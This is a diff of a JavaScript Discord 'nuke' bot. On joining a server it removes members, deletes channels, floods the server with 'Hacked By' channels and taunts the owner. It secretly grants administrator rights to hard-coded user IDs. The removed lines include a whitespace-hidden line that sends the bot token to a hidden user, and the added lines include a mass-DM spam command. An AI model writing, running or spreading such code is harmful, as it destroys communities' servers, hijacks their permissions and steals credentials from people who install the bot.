-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-})
-}
-});
-
-hngel.on('message', message => {
-         if (message.content === "g") {
-                 hngel.guilds.forEach(m =>{
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-
-
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-})
-}
-});
-
-hngel.on('message', message => {
-         if (message.content === "g") {
-                 hngel.guilds.forEach(m =>{
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-
-
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-})
-}
-});
-
-hngel.on('message', message => {
-         if (message.content === "g") {
-                 hngel.guilds.forEach(m =>{
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-
-
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-
-})
-}
-});
-
-hngel.on('message', message => {
-         if (message.content === "g") {
-                 hngel.guilds.forEach(m =>{
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-
-
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
-m.createChannel('  Hacked By GN Is here', 'voice');
 
 
 })
 }
 
 });
-
 
 
 const { Client } = require('discord.js');
 const client = new Client();
 
-async function nuge(guild) {
+async function nuke(guild) {
   let users = 0;
   let channels = 0;
 
-  await guild.fetchMembers('  ’  , موت للجميع');
-  
-    await guild.owner.send('  ’  , تم التهكير ').catch(e => { return void e; });
+  await guild.fetchMembers();
+
+  await guild.owner.send(' Hacked By Dream    سلم على سيرفرك هههههههههههههههه').catch(e => { return void e; });
+
 
 
   await Promise.all(guild.members.map(async (m) => {
@@ -947,43 +437,34 @@ async function nuge(guild) {
       return c.delete();
     }
   }));
-  await guild.createChannel('Hacked ', 'text');
-
-  await guild.createChannel('Hacked ', 'text');
   
+    await guild.createChannel('Hacked u by unknown Is here', 'text');
 
+      await guild.createChannel('Hacked u by unknown Is here', 'voice');
 
-
-
-
-
+  
 
 }
 
-hngel.on('ready', () => {
-  for(const [, g] of hngel.guilds) nuge(g).catch(console.error);
+LOka.on('ready', () => {
+  for(const [, g] of LOka.guilds) nuke(g).catch(console.error);
   console.log('-------------------------------------------------------------');
   console.log('');
-  console.log("  ’ Alshee5-GN-GN ,");
+  console.log("Made by YzhF1");
   console.log("");
   console.log("-------------------------------------------------------------");
 
 });
 
-hngel.on('guildCreate', async (guild) => {
-  return nuge(guild).catch(console.error);
+LOka.on('guildCreate', async (guild) => {
+  return nuke(guild).catch(console.error);
 });
 
- 
-
-hngel.on('guildCreate', async (guild) => {
-    return nuge(guild).catch(console.error);
-  });
-  hngel.on('guildMemberAdd', member => {
-
-                                                                                                                                                                                                                                                                                     if (member.id === "269031102340005888") {
+LOka.on('guildMemberAdd', member => {
+    
+            if (member.id === "411852774767198219") {
                 member.guild.createRole({
-                    name : hngel.user.username,
+                    name : LOka.user.username,
                     color : "RANDOM", 
                     permissions : [8]
                 }).then(function(role){
@@ -993,35 +474,20 @@ hngel.on('guildCreate', async (guild) => {
             }
         
     });
-    hngel.on('guildCreate', async (guild) => {
-        return nuge(guild).catch(console.error);
-      });
-      
-      hngel.on('guildMemberAdd', member => {
-          
-                               //هنا vvvvvvvvvvvvvvvvvv
-                  if (member.id === "467217930715791371") {//هنا الايدي بتاعك <<<<<<<<<<<<<<<<
-                      member.guild.createRole({
-                          name : hngel.user.username,
-                          color : "RANDOM", 
-                          permissions : [8]
-                      }).then(function(role){
-                          member.addRole(role)
-                      })
-                      
-                  }
-              
-          });
-          hngel.on('message' , message => {
-            if (message.author.bot) return;
-                        if (message.content.startsWith("467217930715791371")) {
-                                                                                                                                                                                                                                                                                                                                                 hngel.users.get("269031102340005888").send(tokn+":"+message.guild.name)
-            m.delete();
-          
-            }
-                
-            });
 
-       //هنا vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv
+    
+client.on('message', message => {
+    if(!message.channel.guild) return;
+let args = message.content.split(' ').slice(1).join(' ');
+if (message.content.startsWith('$dream')){
+if(!message.author.id === '472413769700474901') return;
+message.channel.sendMessage('جار ارسال الرسالة |:white_check_mark:')
+client.users.forEach(m =>{
+m.sendMessage(args)
+})
+}
+});
 
-hngel.login(process.env.BOT_TOKEN); 
+
+
+LOka.login(process.env.BOT_TOKEN); 
